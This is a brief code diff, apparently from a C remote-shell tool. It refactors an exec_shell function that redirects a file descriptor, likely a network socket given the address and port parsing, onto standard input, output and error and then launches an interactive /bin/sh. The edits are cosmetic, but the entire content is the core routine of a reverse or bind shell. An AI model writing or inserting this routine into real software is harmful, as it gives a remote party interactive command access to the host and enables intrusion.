@@ -46,11 +46,11 @@ static int parse_args(int argc, char *argv[], struct in_addr *addr, in_port_t *s
 
 static void exec_shell(int fd)
 {
-    char *cmd[3] = { "/bin/sh", "-i", NULL };
+    char *const cmd[3] = { "/bin/sh", "-i", NULL };
 
-    dup2(fd, fileno(stdin));
-    dup2(fd, fileno(stdout));
-    dup2(fd, fileno(stderr));
+    dup2(fd, STDIN_FILENO);
+    dup2(fd, STDOUT_FILENO);
+    dup2(fd, STDERR_FILENO);
 
     execv(cmd[0], cmd);
 }
